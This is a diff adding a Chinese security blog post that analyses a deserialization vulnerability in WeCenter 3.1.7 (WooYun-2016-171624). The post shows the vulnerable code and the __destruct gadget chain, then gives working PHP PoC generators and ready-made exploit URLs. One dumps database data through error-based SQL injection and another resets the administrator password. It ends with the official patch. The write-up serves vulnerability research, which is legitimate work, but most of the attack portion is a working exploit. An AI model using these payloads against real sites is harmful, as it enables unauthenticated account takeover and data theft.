@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>WooYun-2016-171624 wecenter 3.17 反序列化漏洞 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">WooYun-2016-171624 wecenter 3.17 反序列化漏洞</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-01-05&nbsp;&nbsp;18:46:54</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h3><p>WeCenter 是一个类似知乎以问答为基础的完全开源的社交网络建站程序，基于 PHP+MYSQL 应用架构，它集合了问答，digg，wiki 等多个程序的优点，帮助用户轻松搭建专业的知识库和在线问答社区。 </p>
+<p>在wecenter 3.1.7版本中存在一个反序列化漏洞，该漏洞无需登录，利用简单，可以导致任意SQL语句执行，其漏洞的触发点在<code>app/m/weixin.php</code>中。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li>wecenter 3.1.7</li>
+<li>php 5.6 （php7以上不支持）</li>
+<li>Ubuntu18.04 + Mysql 5.7 + Apache2</li>
+</ul>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authorization_action</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model(<span class="string">'account'</span>)-&gt;logout();</span><br><span class="line">	<span class="keyword">unset</span>(AWS_APP::session()-&gt;WXConnect);</span><br><span class="line">	<span class="keyword">if</span> (get_setting(<span class="string">'weixin_account_role'</span>) != <span class="string">'service'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		H::redirect_msg(AWS_APP::lang()-&gt;_t(<span class="string">'此功能只适用于通过微信认证的服务号'</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ($_GET[<span class="string">'code'</span>] <span class="keyword">OR</span> $_GET[<span class="string">'state'</span>] == <span class="string">'OAUTH'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ($_GET[<span class="string">'state'</span>] == <span class="string">'OAUTH'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$access_token = unserialize(base64_decode($_GET[<span class="string">'access_token'</span>]));</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个漏洞需要先注册一个微信公众号，为了本地测试方便起见，我把相关代码<code>get_setting(&#39;weixin_account_role&#39;) != &#39;service&#39;</code>全部换成<code>get_setting(&#39;weixin_account_role&#39;) == &#39;service&#39;</code></p>
+<p><img src="/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/imgs/1.png" alt="1"></p>
+<p>修改后关键代码就变成了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authorization_action</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model(<span class="string">'account'</span>)-&gt;logout();</span><br><span class="line">	<span class="keyword">unset</span>(AWS_APP::session()-&gt;WXConnect);</span><br><span class="line">	<span class="keyword">if</span> (get_setting(<span class="string">'weixin_account_role'</span>) == <span class="string">'service'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		H::redirect_msg(AWS_APP::lang()-&gt;_t(<span class="string">'此功能只适用于通过微信认证的服务号'</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ($_GET[<span class="string">'code'</span>] <span class="keyword">OR</span> $_GET[<span class="string">'state'</span>] == <span class="string">'OAUTH'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ($_GET[<span class="string">'state'</span>] == <span class="string">'OAUTH'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$access_token = unserialize(base64_decode($_GET[<span class="string">'access_token'</span>]));</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$access_token = unserialize(base64_decode($_GET[&#39;access_token&#39;]));</code>这条语句将<code>$_GET[&#39;access_token&#39;]</code>解码后进行反序列化，但是并没有对<code>$_GET[&#39;access_token&#39;]</code>进行过滤，导致用户对该参数可控</p>
+<h4 id="PoC构造"><a href="#PoC构造" class="headerlink" title="PoC构造"></a>PoC构造</h4><p>我们先来看一个数据库操作类<code>AWS_MODEL</code>，我们知道对于反序列化漏洞我们要找魔术方法，这个类中就有一个可以利用的<code>__destruct()</code>魔术方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WeCenter 数据库操作类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span>		WeCenter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@subpackage</span>	System</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@category</span>	Libraries</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>		WeCenter Dev Team</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AWS_MODEL</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Model 类析构, 执行延迟查询</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;master();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_shutdown_query <span class="keyword">AS</span> $key =&gt; $query)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;query($query);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>_destruct()</code>函数中直接遍历了_shutdown_query对象，并且将值传入了query直接执行。所以只要构造一个<code>AWS_MODEL</code>类对象，在它被销毁的时候就能够执行任意的sql语句了。</p>
+<p>我们重新看一下<code>authorization_action()</code>函数</p>
+<p><img src="/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/imgs/3.png" alt="3"></p>
+<p>因为我们想要反序列化后的对象执行__destruct()析构函数，就必须让这个执行过程停止，在<code>authorization_action()</code>函数的135行刚好存在报错语句，条件是<code>$access_token[&#39;errcode&#39;]</code>的值为true，所以我们可以构造一个数组，数组的第一个元素是<code>error =&gt; true</code>，第二个元素就是<code>AWS_MODEL</code>类对象，在<code>AWS_MODEL</code>类对象的构造函数__construct()中对$_shutdown_query赋值为我们的sql查询语句，就可以在它调用__destruct()时执行<code>$this-&gt;query($query);</code>语句了。</p>
+<p>跟进query()函数，发现有<code>show_error</code>，所以我们可以用报错注入来得到数据库数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">($sql, $limit = null, $offset = null, $where = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;slave();</span><br><span class="line">	<span class="keyword">if</span> (!$sql)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Query was empty.'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($where)</span><br><span class="line">	&#123;</span><br><span class="line">		$sql .= <span class="string">' WHERE '</span> . $where;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($limit)</span><br><span class="line">	&#123;</span><br><span class="line">		$sql .= <span class="string">' LIMIT '</span> . $limit;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($offset)</span><br><span class="line">	&#123;</span><br><span class="line">		$sql .= <span class="string">' OFFSET '</span> . $offset;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (AWS_APP::config()-&gt;get(<span class="string">'system'</span>)-&gt;debug)</span><br><span class="line">	&#123;</span><br><span class="line">		$start_time = microtime(<span class="keyword">TRUE</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		$result = <span class="keyword">$this</span>-&gt;db()-&gt;query($sql);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">		show_error(<span class="string">"Database error\n------\n\nSQL: &#123;$sql&#125;\n\nError Message: "</span> . $e-&gt;getMessage(), $e-&gt;getMessage());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (AWS_APP::config()-&gt;get(<span class="string">'system'</span>)-&gt;debug)</span><br><span class="line">	&#123;</span><br><span class="line">		AWS_APP::debug_log(<span class="string">'database'</span>, (microtime(<span class="keyword">TRUE</span>) - $start_time), $sql);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PoC：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AWS_MODEL</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_shutdown_query;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_shutdown_query = [</span><br><span class="line">            <span class="string">"SELECT updatexml(1,concat(0xa,user()),1)"</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$arr = [</span><br><span class="line">    <span class="string">'errcode'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    <span class="keyword">new</span> AWS_MODEL()</span><br><span class="line">];</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($arr)));</span><br></pre></td></tr></table></figure>
+
+<p>得到PoC：<a href="http://192.168.247.132/wecenter/?/m/weixin/authorization/?code=1&amp;state=OAUTH&amp;access_token=YToyOntzOjc6ImVycmNvZGUiO2k6MTtpOjA7Tzo5OiJBV1NfTU9ERUwiOjE6e3M6MjY6IgBBV1NfTU9ERUwAX3NodXRkb3duX3F1ZXJ5IjthOjE6e2k6MDtzOjQwOiJTRUxFQ1QgdXBkYXRleG1sKDEsY29uY2F0KDB4YSx1c2VyKCkpLDEpIjt9fX0%3D&amp;XDEBUG_SESSION_START=12673" target="_blank" rel="noopener">http://192.168.247.132/wecenter/?/m/weixin/authorization/?code=1&amp;state=OAUTH&amp;access_token=YToyOntzOjc6ImVycmNvZGUiO2k6MTtpOjA7Tzo5OiJBV1NfTU9ERUwiOjE6e3M6MjY6IgBBV1NfTU9ERUwAX3NodXRkb3duX3F1ZXJ5IjthOjE6e2k6MDtzOjQwOiJTRUxFQ1QgdXBkYXRleG1sKDEsY29uY2F0KDB4YSx1c2VyKCkpLDEpIjt9fX0%3D&amp;XDEBUG_SESSION_START=12673</a></p>
+<p><img src="/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/imgs/7.png" alt="7"></p>
+<p>然后进一步可以爆出表名，字段名，接下来我们就可以修改管理员的密码。</p>
+<p>这里还需要注意的就是wecenter的密码都是加密过的，所以我们先找到wecenter中的加密方法，用相同的方法生成新的密码，加密方法在<code>system/functions.inc.php</code>中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据 salt 混淆密码</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compile_password</span><span class="params">($password, $salt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$password = md5(md5($password) . $salt);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将原先的密码改成<code>123456</code>，salt选用<code>aaaa</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compile_password</span><span class="params">($password, $salt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$password = md5(md5($password) . $salt);</span><br><span class="line">	<span class="keyword">echo</span> $password;</span><br><span class="line">&#125;</span><br><span class="line">compile_password(<span class="string">'123456'</span>, <span class="string">'aaaa'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以得到密码efeec90d2556454dc30d818fe50393a4，然后就可以用update语句来更新管理员密码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AWS_MODEL</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_shutdown_query;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_shutdown_query = [</span><br><span class="line">            <span class="string">"update `aws_users` set password='efeec90d2556454dc30d818fe50393a4',salt='aaaa' where uid=1;"</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$arr = [</span><br><span class="line">    <span class="string">'errcode'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    <span class="keyword">new</span> AWS_MODEL()</span><br><span class="line">];</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($arr)));</span><br></pre></td></tr></table></figure>
+
+<p>生成PoC：<a href="http://192.168.247.133/wecenter317/?/m/weixin/authorization/?code=1&amp;state=OAUTH&amp;access_token=YToyOntzOjc6ImVycmNvZGUiO2k6MTtpOjA7Tzo5OiJBV1NfTU9ERUwiOjE6e3M6MjY6IgBBV1NfTU9ERUwAX3NodXRkb3duX3F1ZXJ5IjthOjE6e2k6MDtzOjkxOiJ1cGRhdGUgYGF3c191c2Vyc2Agc2V0IHBhc3N3b3JkPSdlZmVlYzkwZDI1NTY0NTRkYzMwZDgxOGZlNTAzOTNhNCcsc2FsdD0nYWFhYScgd2hlcmUgdWlkPTE7Ijt9fX0%3D" target="_blank" rel="noopener">http://192.168.247.133/wecenter317/?/m/weixin/authorization/?code=1&amp;state=OAUTH&amp;access_token=YToyOntzOjc6ImVycmNvZGUiO2k6MTtpOjA7Tzo5OiJBV1NfTU9ERUwiOjE6e3M6MjY6IgBBV1NfTU9ERUwAX3NodXRkb3duX3F1ZXJ5IjthOjE6e2k6MDtzOjkxOiJ1cGRhdGUgYGF3c191c2Vyc2Agc2V0IHBhc3N3b3JkPSdlZmVlYzkwZDI1NTY0NTRkYzMwZDgxOGZlNTAzOTNhNCcsc2FsdD0nYWFhYScgd2hlcmUgdWlkPTE7Ijt9fX0%3D</a> ，访问这个url即可触发漏洞。</p>
+<p>先把admin密码随便修改一下</p>
+<p><img src="/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/imgs/4.png" alt="4"></p>
+<p>然后访问PoC这个url：</p>
+<p><img src="/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/imgs/5.png" alt></p>
+<p>执行后admin密码就被重置了。</p>
+<p><img src="/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/imgs/6.png" alt="6"></p>
+<h3 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h3><p>在wecenter 3.1.9 版本中，官方做出的修补是用<code>json_decode()</code>函数来替换<code>unserialize()</code>函数</p>
+<p>将下面的几行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'state'</span>] == <span class="string">'OAUTH'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$access_token = unserialize(base64_decode($_GET[<span class="string">'access_token'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>替换为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'state'</span>] == <span class="string">'OAUTH'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$access_token = json_decode(base64_decode($_GET[<span class="string">'access_token'</span>]), <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/imgs/patch.png" alt="patch"></p>
+<p>json_decode()函数中第二个参数为<code>true</code>，所以会返回一个array()而不是object</p>
+<p><img src="/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/imgs/2.png" alt="json_decode"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://bantttian.github.io/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/01/13/CVE-2020-5513-GilaCMS1.1.18%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/">CVE-2020-5513 Gila CMS 1.1.18 路径遍历漏洞</a>
+            
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
